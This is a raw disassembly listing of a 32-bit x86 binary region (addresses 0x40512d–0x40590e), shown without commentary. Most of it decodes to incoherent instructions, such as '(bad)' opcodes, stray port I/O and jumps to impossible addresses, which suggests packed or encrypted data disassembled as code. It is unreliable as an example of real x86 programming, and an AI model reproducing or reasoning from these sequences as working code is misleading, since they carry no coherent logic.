  40512d:	lods   al,BYTE PTR ds:[esi]
  40512e:	add    al,0x98
  405130:	rcl    ebx,0xf7
  405133:	mov    dl,bl
  405135:	push   ebx
  405136:	sub    esi,DWORD PTR [eax+0x70]
  405139:	cmp    eax,0xf570707d
  40513e:	(bad)  [esi]
  405140:	jecxz  0x405121
  405142:	ins    BYTE PTR es:[edi],dx
  405143:	outs   dx,BYTE PTR ds:[esi]
  405144:	loopne 0x40515c
  405146:	popf   
  405147:	mov    gs,WORD PTR [edi]
  405149:	cdq    
  40514a:	add    al,0x12
  40514c:	add    edi,esi
  40514e:	js     0x4050dc
  405150:	push   cs
  405151:	push   esi
  405152:	cmp    al,BYTE PTR [ebp+0x28ffd9cc]
  405158:	xchg   ecx,eax
  405159:	sbb    edx,DWORD PTR [esi+ebx*8-0x5]
  40515d:	mov    ebp,0xfc4bd8b
  405162:	inc    ebp
  405163:	inc    ebp
  405164:	ret    
  405165:	pop    esi
  405166:	inc    BYTE PTR [ecx+0x20]
  405169:	fbstp  TBYTE PTR [ebx+0x5]
  40516c:	es popa 
  40516e:	pushf  
  40516f:	dec    ebp
  405170:	icebp  
  405171:	mov    ah,0x41
  405173:	iret   
  405174:	cmp    ebp,ebx
  405176:	fld    TBYTE PTR [eax]
  405178:	dec    ecx
  405179:	hlt    
  40517a:	xchg   BYTE PTR [esi],dh
  40517c:	mov    ecx,0xadfe05c2
  405181:	div    BYTE PTR [ecx+0x3e916f84]
  405187:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405188:	call   0x85d58438
  40518d:	mov    gs,WORD PTR [ecx+edx*8]
  405190:	bound  eax,QWORD PTR [edx+0x4c57a598]
  405196:	lea    ebx,ds:0xe75086e5
  40519c:	or     ebp,DWORD PTR ds:0x476026ad
  4051a2:	cs sbb eax,0x78f81628
  4051a8:	js     0x4051e2
  4051aa:	cli    
  4051ab:	(bad)  
  4051ac:	cdq    
  4051ad:	rep lods eax,DWORD PTR ds:[esi]
  4051af:	xchg   esi,eax
  4051b0:	xchg   BYTE PTR [eax-0x12b5df22],cl
  4051b6:	or     esp,DWORD PTR [ebx-0x25]
  4051b9:	iret   
  4051ba:	pop    eax
  4051bb:	or     dl,BYTE PTR [ecx+ebp*4]
  4051be:	mov    ds:0xfabbca48,eax
  4051c3:	inc    ebx
  4051c4:	outs   dx,BYTE PTR ds:[esi]
  4051c5:	test   eax,0x73c69569
  4051ca:	sbb    dl,ah
  4051cc:	fimul  DWORD PTR [eax-0x1d0e43b6]
  4051d2:	jo     0x405239
  4051d4:	jb     0x405251
  4051d6:	fimul  WORD PTR [ebx]
  4051d8:	inc    esi
  4051d9:	test   DWORD PTR [ebx],eax
  4051db:	(bad)  
  4051dc:	mov    dl,0xdd
  4051de:	in     eax,0x39
  4051e0:	jbe    0x40524f
  4051e2:	jnp    0x405219
  4051e4:	add    ebx,DWORD PTR [ebx+0x57a7ccf2]
  4051ea:	shr    DWORD PTR [edx+eiz*1-0x6d6418c],1
  4051f1:	push   edi
  4051f2:	je     0x4051c0
  4051f4:	pop    edi
  4051f5:	into   
  4051f6:	push   edx
  4051f7:	jbe    0x405261
  4051f9:	fimul  WORD PTR [edx+0x635f15c6]
  4051ff:	cmp    DWORD PTR [eax+eax*8-0x6976aecb],edi
  405206:	pusha  
  405207:	(bad)  [eax+edi*8+0x38715769]
  40520e:	in     eax,0x59
  405210:	stos   DWORD PTR es:[edi],eax
  405211:	and    DWORD PTR [edi-0x58],edx
  405214:	pop    ebx
  405215:	push   ss
  405216:	jg     0x40527f
  405218:	cmp    BYTE PTR [eax],bl
  40521a:	sub    eax,0xfdbeccaa
  40521f:	jmp    0x9a89:0xbd07a47
  405226:	or     DWORD PTR [esi-0x5fc7bdd7],esp
  40522c:	jmp    0x59a44e67
  405231:	cwde   
  405232:	pop    esi
  405233:	xor    eax,0x507a9de5
  405238:	and    BYTE PTR [ebx-0x4a106856],al
  40523e:	stos   BYTE PTR es:[edi],al
  40523f:	or     BYTE PTR [edi+0x39d8bc6c],bh
  405245:	das    
  405246:	(bad)  
  405248:	lock in al,0xc7
  40524b:	stc    
  40524c:	push   0x29
  40524e:	push   0x825df45b
  405253:	inc    ebp
  405254:	cmp    ch,bh
  405256:	out    0xdd,eax
  405258:	pop    edi
  405259:	pop    edx
  40525a:	push   0x48bde552
  40525f:	scas   al,BYTE PTR es:[edi]
  405260:	test   BYTE PTR [edi],bh
  405262:	fwait
  405263:	test   BYTE PTR [esi+0x3f],ch
  405266:	cmp    esp,eax
  405268:	mov    edx,0x58dbb9fa
  40526d:	add    ebp,DWORD PTR [esi]
  40526f:	aaa    
  405270:	repz xchg esi,eax
  405272:	call   0x2c15a770
  405277:	in     al,dx
  405278:	(bad)  
  405279:	mov    eax,0x2af353ac
  40527e:	aas    
  40527f:	jnp    0x4052d5
  405281:	mov    ds:0x25f1aec2,al
  405286:	jge    0x4052ab
  405288:	pop    es
  405289:	lea    esi,[edi]
  40528b:	and    bl,BYTE PTR [esi+0x713d431c]
  405291:	scas   al,BYTE PTR es:[edi]
  405292:	jno    0x405292
  405294:	mov    dh,BYTE PTR [edx]
  405296:	cld    
  405297:	mov    ch,0x76
  405299:	cmp    ebp,DWORD PTR [ebp+0x3b060623]
  40529f:	data16 adc al,0x6c
  4052a2:	scas   al,BYTE PTR es:[edi]
  4052a3:	leave  
  4052a4:	shr    DWORD PTR gs:[edx],0x1b
  4052a8:	loopne 0x405236
  4052aa:	mov    ecx,DWORD PTR [esi]
  4052ac:	dec    ebp
  4052ad:	std    
  4052ae:	fild   WORD PTR [eax-0x3d740544]
  4052b4:	xchg   DWORD PTR [eax],eax
  4052b6:	shl    eax,cl
  4052b8:	push   esp
  4052b9:	test   ch,0x5e
  4052bc:	scas   al,BYTE PTR es:[edi]
  4052bd:	xor    cl,BYTE PTR ds:0x178961c8
  4052c3:	push   ecx
  4052c4:	scas   eax,DWORD PTR es:[edi]
  4052c5:	dec    eax
  4052c6:	jae    0x405290
  4052c8:	jnp    0x405257
  4052ca:	pop    ecx
  4052cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4052cc:	inc    eax
  4052cd:	cs mov bh,0x22
  4052d0:	adc    eax,0xc7dde588
  4052d5:	je     0x405281
  4052d7:	call   0x657c:0x60f39946
  4052de:	pop    esi
  4052df:	sar    DWORD PTR [ebx-0x60d29c09],0xca
  4052e6:	add    DWORD PTR [esi-0x6d],ebx
  4052e9:	xchg   esi,eax
  4052ea:	push   ss
  4052eb:	push   esp
  4052ec:	leave  
  4052ed:	add    esp,eax
  4052ef:	xor    BYTE PTR [ecx],bl
  4052f1:	(bad)  
  4052f2:	stos   DWORD PTR es:[edi],eax
  4052f3:	stc    
  4052f4:	(bad)  
  4052f5:	pop    eax
  4052f6:	popa   
  4052f7:	add    al,0x9f
  4052f9:	dec    ecx
  4052fa:	in     eax,0x17
  4052fc:	scas   al,BYTE PTR es:[edi]
  4052fd:	cld    
  4052fe:	push   ebx
  4052ff:	test   eax,0x4689ff45
  405304:	shl    ecx,cl
  405306:	push   es
  405307:	adc    eax,ebp
  405309:	cmove  esp,DWORD PTR [edi-0x6]
  40530d:	mov    ch,al
  40530f:	and    eax,0x19525218
  405314:	push   0x382bc21d
  405319:	bound  esp,QWORD PTR [esi]
  40531b:	rcl    DWORD PTR [ebx-0x79],cl
  40531e:	shr    DWORD PTR [eax+0x606a7e47],1
  405324:	push   cs
  405325:	inc    ecx
  405326:	sub    ch,ah
  405328:	xchg   ebx,ebp
  40532a:	ffree  st(2)
  40532c:	jnp    0x4052e6
  40532e:	pop    eax
  40532f:	inc    ebp
  405330:	push   ebx
  405331:	xor    ebx,esp
  405333:	mov    dh,0x87
  405335:	loopne 0x40531d
  405337:	cmp    esi,DWORD PTR [edx+0x22]
  40533a:	fmul   DWORD PTR [edx]
  40533c:	fwait
  40533d:	sbb    DWORD PTR [ebx],eax
  40533f:	jae    0x40531d
  405341:	aas    
  405342:	xor    ebp,DWORD PTR [esi-0x47]
  405345:	jo     0x4052f3
  405347:	xor    ah,al
  405349:	in     eax,0xa8
  40534b:	push   cs
  40534c:	jmp    DWORD PTR [esi+0x730801]
  405352:	jo     0x4053b6
  405354:	dec    ecx
  405355:	js     0x405333
  405357:	or     BYTE PTR [esi-0x7f],ah
  40535a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40535b:	xchg   edi,eax
  40535c:	mov    ch,0x22
  40535e:	sub    BYTE PTR [ebp-0x3a6dff9e],ch
  405364:	into   
  405365:	mov    DWORD PTR [ecx-0x36b08f39],ebx
  40536b:	inc    esp
  40536c:	add    DWORD PTR [eax],edi
  40536e:	cmp    esp,edi
  405370:	(bad)  
  405371:	dec    ecx
  405372:	jb     0x4053d7
  405374:	or     edx,DWORD PTR [esi]
  405376:	outs   dx,BYTE PTR ds:[esi]
  405377:	dec    eax
  405378:	rol    BYTE PTR [edx],0x6f
  40537b:	xrelease xchg DWORD PTR ds:[ebx-0x28ca2220],esp
  405383:	xor    BYTE PTR [edi+0x49089089],0xa7
  40538a:	icebp  
  40538b:	sub    esi,DWORD PTR [edi-0x1c]
  40538e:	inc    ebx
  40538f:	out    0xc,eax
  405391:	xor    DWORD PTR [eax],edx
  405393:	adc    eax,0x99739704
  405398:	jmp    0xc6090842
  40539d:	jns    0x405368
  40539f:	xchg   edx,eax
  4053a0:	or     eax,0x38e628c3
  4053a5:	loop   0x405411
  4053a7:	inc    eax
  4053a8:	add    al,0x7
  4053aa:	stc    
  4053ab:	les    edi,FWORD PTR [edx-0x4d34ec90]
  4053b1:	mov    esp,0xe77a2ade
  4053b6:	(bad)  
  4053b9:	into   
  4053ba:	leave  
  4053bb:	call   0xaf778d43
  4053c0:	call   0x811c:0x991ff63d
  4053c7:	xchg   DWORD PTR [ebp-0x1e8890ac],ebp
  4053cd:	ins    DWORD PTR es:[edi],dx
  4053ce:	jb     0x4053c1
  4053d0:	sbb    BYTE PTR [edx],0x58
  4053d3:	mov    eax,ds:0x3686f499
  4053d8:	dec    eax
  4053da:	add    BYTE PTR [ebp-0x53],al
  4053dd:	mov    esp,0x71df2dfc
  4053e2:	repz adc al,0x56
  4053e5:	mov    dh,bl
  4053e7:	imul   ebp,ebp,0xffffffc1
  4053ea:	imul   esi,ecx,0x3a
  4053ed:	mov    edi,0x8fe33376
  4053f2:	sub    eax,0x138dcaa
  4053f7:	mov    bh,0x61
  4053f9:	lds    esp,FWORD PTR ds:0x91a019d1
  4053ff:	repnz (bad) 
  405401:	jmp    0x40543a
  405403:	enter  0xb10a,0xac
  405407:	loope  0x4053f5
  405409:	and    ch,ch
  40540b:	daa    
  40540c:	xchg   BYTE PTR [ebx+0x12],bl
  40540f:	adc    al,0xfb
  405411:	adc    bh,ah
  405413:	outs   dx,BYTE PTR ds:[esi]
  405414:	dec    ebp
  405415:	push   ds
  405416:	int    0xf6
  405418:	lods   eax,DWORD PTR ds:[esi]
  405419:	retf   
  40541a:	push   ecx
  40541b:	adc    eax,0x124261f0
  405420:	call   0x269a:0x41b507ae
  405427:	dec    edx
  405428:	jmp    0x4053c0
  40542a:	cmp    dh,0x59
  40542d:	push   es
  40542e:	aaa    
  40542f:	data16 aaa 
  405431:	(bad)  
  405432:	jnp    0x405420
  405434:	fmul   QWORD PTR [esi]
  405436:	dec    ebx
  405437:	repnz mov ds:0x4f2d781e,al
  40543d:	and    ebp,eax
  40543f:	cld    
  405440:	jnp    0x4053c4
  405442:	and    BYTE PTR [ecx],bl
  405444:	out    0x68,eax
  405446:	sbb    bh,ah
  405448:	call   0x62e52a9e
  40544d:	in     eax,dx
  40544e:	sbb    al,0x9d
  405450:	mov    ah,0xb7
  405452:	lods   al,BYTE PTR ds:[esi]
  405453:	shl    BYTE PTR [esi],1
  405455:	popa   
  405456:	in     eax,0xa4
  405458:	jo     0x405487
  40545a:	sub    DWORD PTR [esi],0x48b441cc
  405460:	clc    
  405461:	sahf   
  405462:	add    DWORD PTR [edi-0x1f],ebp
  405465:	mov    al,cl
  405467:	(bad)  
  405468:	xchg   esp,eax
  405469:	sbb    eax,0x63506ebc
  40546e:	fisttp DWORD PTR [ebp+0x42]
  405471:	or     BYTE PTR [eax],dh
  405473:	loopne 0x405400
  405475:	mov    dl,0xc0
  405477:	push   edx
  405478:	or     edx,DWORD PTR [edi-0x65]
  40547b:	cdq    
  40547c:	lds    eax,FWORD PTR [esi-0x36a14137]
  405482:	ret    0xc
  405485:	push   ebp
  405486:	mov    ebp,esp
  405488:	push   ecx
  405489:	mov    edx,DWORD PTR ds:0x42e784
  40548f:	mov    edx,DWORD PTR [edx]
  405491:	sbb    DWORD PTR ds:0x42e6eb,edx
  405497:	jmp    0x40576a
  40549c:	pop    ecx
  40549d:	scas   al,BYTE PTR es:[edi]
  40549e:	sbb    BYTE PTR [ebx-0xd],al
  4054a1:	push   ecx
  4054a2:	pop    ecx
  4054a3:	mov    dh,0xd4
  4054a5:	(bad)
  4054a8:	sub    al,BYTE PTR [esi]
  4054aa:	pop    esp
  4054ab:	adc    DWORD PTR [eax],edx
  4054ad:	aaa    
  4054ae:	jo     0x405520
  4054b0:	stos   BYTE PTR es:[edi],al
  4054b1:	jle    0x405523
  4054b3:	jo     0x405453
  4054b5:	popf   
  4054b6:	xchg   DWORD PTR [ecx],esi
  4054b8:	in     eax,0x98
  4054ba:	sbb    al,0xf4
  4054bc:	fiadd  DWORD PTR [edx]
  4054be:	cmp    ch,bl
  4054c0:	pop    edx
  4054c1:	in     eax,0x88
  4054c3:	out    0x27,al
  4054c5:	mov    ecx,DWORD PTR [ebx]
  4054c7:	pop    ss
  4054c8:	jmp    0x405541
  4054ca:	jmp    0x5a3:0xf71aabb8
  4054d1:	pop    ds
  4054d2:	and    ecx,DWORD PTR [esi-0x2905774f]
  4054d8:	icebp  
  4054d9:	xchg   esi,eax
  4054da:	je     0x4054e7
  4054dc:	pop    edi
  4054dd:	mov    esi,0xdd317027
  4054e2:	pop    ebp
  4054e3:	adc    DWORD PTR [eax+0x2b],edx
  4054e6:	mov    al,ds:0xa1ab599f
  4054eb:	pop    esi
  4054ec:	jne    0x4054d1
  4054ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4054ef:	(bad)  
  4054f0:	(bad)  
  4054f1:	jmp    0x61fa4c41
  4054f6:	lods   al,BYTE PTR ds:[esi]
  4054f7:	cli    
  4054f8:	push   cs
  4054f9:	cdq    
  4054fa:	pop    ds
  4054fb:	sbb    DWORD PTR [edi],eax
  4054fd:	pop    esp
  4054fe:	imul   ebp,DWORD PTR [edx+0x5f],0xff080c7a
  405505:	jp     0x405506
  405507:	aas    
  405508:	mov    ch,0x93
  40550a:	ja     0x405490
  40550c:	mov    al,ds:0x79732b80
  405511:	adc    al,0x50
  405513:	pop    eax
  405514:	in     eax,dx
  405515:	loope  0x405506
  405517:	sti    
  405518:	fwait
  405519:	loop   0x405527
  40551b:	xchg   edi,eax
  40551c:	rcl    DWORD PTR [ebx+0x4e],1
  40551f:	jp     0x4054c0
  405521:	push   ss
  405522:	push   0xffffffbc
  405524:	aas    
  405525:	ficomp DWORD PTR [edx]
  405527:	loop   0x4054da
  405529:	fimul  DWORD PTR [edx+eax*4]
  40552c:	lods   eax,DWORD PTR ds:[esi]
  40552d:	add    bh,ch
  40552f:	(bad)  
  405530:	jno    0x4055a4
  405532:	int3   
  405533:	inc    esi
  405534:	stos   BYTE PTR es:[edi],al
  405535:	inc    DWORD PTR [edi-0x5e5be8f5]
  40553b:	in     al,dx
  40553c:	jmp    0x95842e84
  405541:	jns    0x4054d9
  405543:	neg    BYTE PTR [edx-0x1bc75930]
  405549:	daa    
  40554a:	pop    esp
  40554b:	mov    edx,0xdb3b3f76
  405550:	cwde   
  405551:	add    edi,DWORD PTR ss:0x607ffee6
  405558:	(bad)  
  405559:	xchg   esp,eax
  40555a:	fisub  WORD PTR [eax]
  40555c:	aas    
  40555d:	pop    esp
  40555e:	or     al,0x6c
  405560:	push   esp
  405561:	jmp    0x573f21a
  405566:	and    bh,BYTE PTR [edi+0x14]
  405569:	mov    edi,0x272a691f
  40556e:	sti    
  40556f:	mov    edx,0xff40a2ca
  405574:	xor    BYTE PTR [eax-0x538471d2],cl
  40557a:	xchg   edx,eax
  40557b:	inc    ebp
  40557c:	mov    ebp,DWORD PTR [edi+edi*1+0x2e]
  405580:	add    BYTE PTR [esi+eiz*1],ch
  405583:	push   ebp
  405584:	loop   0x40551e
  405586:	jmp    0x4055e7
  405588:	mov    ecx,0xf58e9af6
  40558d:	test   eax,0xfe92de54
  405592:	push   0x5d
  405594:	loop   0x405614
  405596:	add    eax,0xabdceedd
  40559b:	fiadd  DWORD PTR [ecx]
  40559d:	cs jle 0x405602
  4055a0:	sbb    esp,DWORD PTR [esi-0x15377e26]
  4055a6:	inc    ecx
  4055a7:	stc    
  4055a8:	fsub   QWORD PTR [esi+0x59]
  4055ab:	(bad)  
  4055ac:	enter  0x1ce0,0xb1
  4055b0:	mov    eax,ds:0x3740075b
  4055b5:	nop
  4055b6:	rcr    DWORD PTR [esi],1
  4055b8:	(bad)  [esp+edx*2-0x25]
  4055bc:	mov    eax,0xca8b571f
  4055c1:	mov    dh,0x44
  4055c3:	jp     0x405621
  4055c5:	xor    eax,0xc8541a41
  4055ca:	imul   ecx,DWORD PTR [ebp-0x5e],0x65fb8dd7
  4055d1:	jmp    DWORD PTR [ebx-0x6ab4ba0]
  4055d7:	iret   
  4055d8:	ret    0x8031
  4055db:	cmc    
  4055dc:	into   
  4055dd:	je     0x405584
  4055df:	sub    esi,DWORD PTR [ecx]
  4055e1:	ja     0x405581
  4055e3:	inc    ebp
  4055e4:	cmc    
  4055e5:	sti    
  4055e6:	int3   
  4055e7:	mov    eax,0x140d1dcb
  4055ec:	push   0x73691e82
  4055f1:	or     eax,0x872b151b
  4055f6:	cwde   
  4055f7:	push   cs
  4055f8:	sub    DWORD PTR [edi+0x7d01e398],ecx
  4055fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4055ff:	fs sbb eax,0xd429d1a2
  405606:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405608:	sbb    al,0x39
  40560a:	ftst   
  40560c:	push   edx
  40560d:	stc    
  40560e:	fdivrp st(0),st
  405610:	xchg   BYTE PTR [esi+0x28913f0d],al
  405616:	div    edx
  405618:	in     eax,dx
  405619:	inc    esp
  40561a:	push   ebx
  40561b:	dec    ebx
  40561c:	stos   DWORD PTR es:[edi],eax
  40561d:	in     eax,dx
  40561e:	mov    esi,0x2026a155
  405623:	and    edi,ecx
  405625:	inc    esi
  405626:	hlt    
  405627:	sbb    ebp,DWORD PTR [ebx+0x20a85bb2]
  40562d:	sti    
  40562e:	test   eax,0x1aecb189
  405633:	xchg   BYTE PTR [ebx],bh
  405635:	inc    edx
  405636:	push   0xffffffc5
  405638:	std    
  405639:	pusha  
  40563a:	stos   DWORD PTR es:[edi],eax
  40563b:	mov    ebx,DWORD PTR [ebp-0x41]
  40563e:	inc    esi
  40563f:	hlt    
  405640:	sub    DWORD PTR [ecx+0x6e],ebp
  405643:	add    al,0x97
  405645:	or     DWORD PTR [edi-0x3b],ebx
  405648:	mov    eax,ds:0x157ef5ec
  40564d:	lsl    edi,di
  405650:	pop    ds
  405651:	pop    ebx
  405652:	arpl   WORD PTR [ebx],bx
  405654:	push   cs
  405655:	(bad)  
  405656:	adc    edx,DWORD PTR [edi+0x14c7f6d3]
  40565c:	inc    edi
  40565d:	xor    BYTE PTR [ebx],0x47
  405660:	push   es
  405661:	aam    0x20
  405663:	iret   
  405664:	mov    bh,0xf5
  405666:	mov    ebx,0x2f705bb8
  40566b:	mov    al,ds:0x51c00a49
  405670:	popa   
  405671:	xchg   esp,eax
  405672:	inc    ebx
  405673:	mov    ch,al
  405675:	xchg   esi,eax
  405676:	mov    dh,0xf6
  405678:	and    DWORD PTR [ebp-0x3d],esi
  40567b:	sub    BYTE PTR [edx-0x64],ah
  40567e:	mov    bl,BYTE PTR [eax+0x6f]
  405681:	js     0x40565c
  405683:	das    
  405684:	fnstsw WORD PTR [edi-0x6951196e]
  40568a:	fild   QWORD PTR [edx]
  40568c:	fucomp st(7)
  40568e:	nop
  40568f:	xchg   esp,eax
  405690:	mov    eax,ds:0x5ae5f1ba
  405695:	aam    0x23
  405697:	add    bh,BYTE PTR [eax-0x6a2aa7f0]
  40569d:	bound  ebp,QWORD PTR [eax]
  40569f:	sub    bl,BYTE PTR [ebp-0xd925eda]
  4056a5:	lds    ecx,FWORD PTR [ecx+0x17298325]
  4056ab:	adc    eax,0xfb5f0d6c
  4056b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4056b1:	inc    edi
  4056b2:	pop    ebp
  4056b3:	retf   
  4056b4:	pusha  
  4056b5:	call   0xe416fef8
  4056ba:	ds dec ebx
  4056bc:	or     ah,BYTE PTR [edi-0x57]
  4056bf:	rol    BYTE PTR [esi],cl
  4056c1:	and    DWORD PTR [ebx-0x31],edx
  4056c4:	imul   ebp,DWORD PTR [eax*4-0x246730ea],0x1e19b531
  4056cf:	mov    edx,0x2bb6c791
  4056d4:	mov    al,ds:0x82c39511
  4056d9:	xchg   ebx,eax
  4056da:	fiadd  DWORD PTR [ecx+0xe66a9c6]
  4056e0:	or     ebx,DWORD PTR [eax]
  4056e2:	jnp    0x4056e5
  4056e4:	retf   
  4056e5:	add    esi,ecx
  4056e7:	jae    0x405674
  4056e9:	xor    al,ch
  4056eb:	outs   dx,DWORD PTR ds:[esi]
  4056ec:	sbb    ch,0x27
  4056ef:	lock stos BYTE PTR es:[edi],al
  4056f1:	inc    cl
  4056f3:	ja     0x405753
  4056f5:	sub    al,0x3a
  4056f7:	imul   ch
  4056f9:	out    0x8e,eax
  4056fb:	in     eax,0xd4
  4056fd:	aaa    
  4056fe:	mov    ah,0xeb
  405700:	jl     0x4056f1
  405702:	push   esp
  405703:	out    dx,eax
  405704:	sbb    ch,BYTE PTR [ebp+0x32]
  405707:	clc    
  405708:	lock mov cl,0x78
  40570b:	loopne 0x4056e3
  40570d:	mov    al,0xfc
  40570f:	mov    edx,0xb1d81261
  405714:	and    BYTE PTR [edi+0x6b],cl
  405717:	lea    esp,[ecx+0x61]
  40571a:	mov    ecx,0xe8cec4aa
  40571f:	cdq    
  405720:	jge    0x405791
  405722:	js     0x40578a
  405724:	push   eax
  405725:	call   DWORD PTR [ecx-0x53]
  405728:	jb     0x4056ed
  40572a:	jae    0x4056e5
  40572c:	pop    ebx
  40572d:	inc    ecx
  40572e:	add    DWORD PTR [eax-0x39],esp
  405731:	mov    esi,0xa940d805
  405736:	jb     0x4056f9
  405738:	fwait
  405739:	xor    dl,al
  40573b:	pop    eax
  40573c:	ror    esp,0xa8
  40573f:	jnp    0x4057be
  405741:	pop    edx
  405742:	scas   eax,DWORD PTR es:[edi]
  405743:	xchg   ebx,eax
  405744:	mov    bh,0x89
  405746:	jmp    0xeba4:0x440dd929
  40574d:	stos   DWORD PTR es:[edi],eax
  40574e:	std    
  40574f:	push   es
  405750:	fld    DWORD PTR [esi-0x6cae80e4]
  405756:	jle    0x4057c2
  405758:	sti    
  405759:	icebp  
  40575a:	mov    edi,0x7b30df64
  40575f:	das    
  405760:	mov    DWORD PTR [esi-0x5d],0x245b7a19
  405767:	fs cmp esp,esp
  40576a:	push   ecx
  40576b:	movzx  eax,WORD PTR ds:0x42fd86
  405772:	and    eax,DWORD PTR ds:0x42fd7a
  405778:	mov    ds:0x42fd86,eax
  40577d:	jmp    0x405a50
  405782:	ja     0x4057cf
  405784:	and    eax,0x717221b4
  405789:	dec    ebx
  40578a:	xchg   DWORD PTR [edx+0x34e491be],eax
  405790:	push   edi
  405791:	pop    esp
  405792:	dec    edx
  405793:	xor    eax,0x7eaa7070
  405798:	jo     0x40580a
  40579a:	inc    edx
  40579b:	es loop 0x4057b2
  40579e:	stc    
  40579f:	aad    0xa2
  4057a1:	sti    
  4057a2:	jp     0x405755
  4057a4:	(bad)  
  4057a5:	mov    cl,bl
  4057a7:	xor    al,0x33
  4057a9:	hlt    
  4057aa:	(bad)  
  4057ab:	rol    BYTE PTR [eax+0x35f8a752],1
  4057b1:	cs xchg edi,eax
  4057b3:	lock paddsb mm6,QWORD PTR [edx-0x6eeb0c3d]
  4057bb:	pop    ebx
  4057bc:	mov    eax,0x9d414a46
  4057c1:	or     ebp,DWORD PTR [edx+0x6266ca68]
  4057c7:	pop    esp
  4057c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4057c9:	popf   
  4057ca:	mov    esi,0x3d35c699
  4057cf:	fadd   st,st(2)
  4057d1:	push   eax
  4057d2:	pop    es
  4057d3:	sahf   
  4057d4:	xlat   BYTE PTR ds:[ebx]
  4057d5:	jge    0x4057b7
  4057d7:	(bad)  
  4057d9:	enter  0xf04b,0x4
  4057dd:	cmp    BYTE PTR [edi+0x15bb0538],cl
  4057e3:	jle    0x4057ec
  4057e5:	inc    edx
  4057e6:	je     0x4057f3
  4057e8:	inc    esp
  4057e9:	xor    al,0x0
  4057eb:	(bad)  
  4057ed:	sub    BYTE PTR [ecx],dh
  4057ef:	outs   dx,DWORD PTR ds:[esi]
  4057f0:	scas   al,BYTE PTR es:[edi]
  4057f1:	setg   BYTE PTR [ecx-0x6a4bdd6b]
  4057f8:	jno    0x4057b3
  4057fa:	jnp    0x40585b
  4057fc:	and    BYTE PTR [esi-0x4f],al
  4057ff:	push   es
  405800:	in     al,dx
  405801:	(bad)  
  405802:	retf   0xbc26
  405805:	xor    BYTE PTR [bp+si],dl
  405808:	ja     0x40581c
  40580a:	pop    eax
  40580b:	ins    DWORD PTR es:[edi],dx
  40580c:	(bad)  
  40580d:	(bad)
  405810:	(bad)  
  405811:	mov    dl,0x4c
  405813:	imul   esp,DWORD PTR [edi],0xfffffff0
  405816:	sbb    eax,0x170615ff
  40581b:	(bad)  
  40581c:	(bad)  
  40581d:	pop    edi
  40581e:	scas   eax,DWORD PTR es:[edi]
  40581f:	xor    BYTE PTR [edx-0x5c],bl
  405822:	and    dh,BYTE PTR [ebp+0x3b]
  405825:	outs   dx,DWORD PTR ds:[esi]
  405826:	inc    esp
  405827:	fwait
  405828:	je     0x4057e5
  40582a:	mov    dh,0x20
  40582c:	leave  
  40582d:	cmp    cl,0x78
  405830:	xchg   BYTE PTR [edi+edi*1+0x508d4a77],dh
  405837:	retf   
  405838:	(bad)  
  405839:	pop    ebp
  40583a:	sbb    BYTE PTR [edi+eax*4+0x7a],bl
  40583e:	fwait
  40583f:	adc    esp,DWORD PTR [esi-0x5ef18eb0]
  405845:	pop    ss
  405846:	(bad)  
  405848:	pop    edx
  405849:	xor    eax,DWORD PTR [ebx]
  40584b:	adc    al,BYTE PTR [eax]
  40584d:	mov    edx,0x1aeeee00
  405852:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405853:	mov    BYTE PTR [esi+0x257ad396],bl
  405859:	dec    ebx
  40585a:	fsubr  QWORD PTR [ebx]
  40585c:	xchg   DWORD PTR [esi-0x239a0c98],ebp
  405862:	hlt    
  405863:	jecxz  0x405843
  405865:	add    BYTE PTR [ebx+0x3d],0x6e
  405869:	out    dx,eax
  40586a:	mov    dh,0xc4
  40586c:	and    eax,0xdd6fdae4
  405871:	iret   
  405872:	cmp    eax,0xab149a89
  405877:	arpl   WORD PTR [ebp+0x7],di
  40587a:	sbb    edx,DWORD PTR [ebx]
  40587c:	push   edi
  40587d:	mov    eax,ds:0xd8f5d5f3
  405882:	dec    edi
  405883:	jmp    0x78ab1563
  405888:	cmp    al,0x93
  40588a:	fwait
  40588b:	je     0x4058b6
  40588d:	dec    ebp
  40588e:	in     eax,dx
  40588f:	xchg   cl,al
  405891:	cs mov esi,0xdace6fde
  405897:	pop    ss
  405898:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405899:	hlt    
  40589a:	xchg   ebx,eax
  40589b:	pop    es
  40589c:	fisttp DWORD PTR [ebx+edi*8]
  40589f:	addr16 sub ah,dl
  4058a2:	hlt    
  4058a3:	pop    ecx
  4058a4:	rcl    BYTE PTR [ecx],cl
  4058a6:	and    BYTE PTR ds:0xbc97010c,0x5e
  4058ad:	inc    edx
  4058ae:	push   ss
  4058af:	stos   BYTE PTR es:[edi],al
  4058b0:	and    dh,BYTE PTR [edi]
  4058b2:	mov    ds:0x9539edd1,al
  4058b7:	test   DWORD PTR [eax-0x356913c9],eax
  4058bd:	mov    ecx,ecx
  4058bf:	mov    esi,0x78e3bf38
  4058c4:	xlat   BYTE PTR ds:[ebx]
  4058c5:	hlt    
  4058c6:	arpl   cx,cx
  4058c8:	or     cl,BYTE PTR ds:0x4bc292b1
  4058ce:	mov    eax,ds:0x41298087
  4058d3:	pop    esi
  4058d4:	push   eax
  4058d5:	ror    DWORD PTR ds:0x18fb8462,1
  4058db:	shl    DWORD PTR [esi+0x7d],0xb7
  4058df:	cmp    ebp,esp
  4058e1:	dec    ebp
  4058e2:	in     eax,0x86
  4058e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4058e5:	xor    bh,bl
  4058e7:	or     cl,BYTE PTR [ebx-0x46b41874]
  4058ed:	push   edi
  4058ee:	enter  0x605a,0xbf
  4058f2:	hlt    
  4058f3:	dec    edx
  4058f4:	pop    eax
  4058f5:	and    eax,0x898eace2
  4058fa:	je     0x405936
  4058fc:	dec    esp
  4058fd:	stc    
  4058fe:	fild   QWORD PTR [eax+edx*8+0x3e1ea384]
  405905:	pop    ecx
  405906:	lock cdq 
  405908:	out    0x86,eax
  40590a:	cmc    
  40590b:	mov    bh,dh
  40590d:	xchg   esi,eax
  40590e:	dec    eax
